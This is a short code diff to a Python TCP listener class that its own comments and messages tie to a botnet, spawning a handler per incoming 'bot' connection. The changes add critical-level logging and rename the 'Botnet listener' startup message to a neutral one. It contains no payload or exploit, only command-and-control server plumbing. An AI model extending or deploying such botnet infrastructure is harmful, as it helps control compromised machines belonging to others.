@@ -27,11 +27,13 @@ class Listener_TCP(threading.Thread):
             server.bind(server_address)
             server.listen(1000)
         except Exception as ex:
-            print("[* Server-Msg] Fatal error with listener initialization. Exiting...")
-            print(f"[* Server-Msg] Error: {ex}")
+            print("[* Interpreter-Msg] Fatal error with socket initialization")
+            loggers[0].q_log('serv','critical','[* Interpreter-Msg] Fatal error with socket initialization')
+            print(f"[* Interpreter-Msg] Error: {ex}")
+            loggers[0].q_log('serv','critical',('[* Interpreter-Msg] Error: ' + str(ex)))
             os._exit(0)
 
-        print(f"[* Listener-Msg] Starting Botnet listener on tcp://{self.lhost}:{str(self.lport)}\n")
+        print(f"[* Listener-Msg] Starting TCP listener on tcp://{self.lhost}:{str(self.lport)}\n")
 
         connRecord = 0                                         # Records Connection ID
 
@@ -41,7 +43,7 @@ class Listener_TCP(threading.Thread):
             print(f"\n[* Listener-Msg] Connection received from {str(client_address[0])}\n")
 
             # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
-            newConn = Handler(client, client_address, connRecord)
+            newConn = Handler(client, client_address, connRecord, self.loggers)
             newConn.start()
 
             self.agentList.append(newConn)
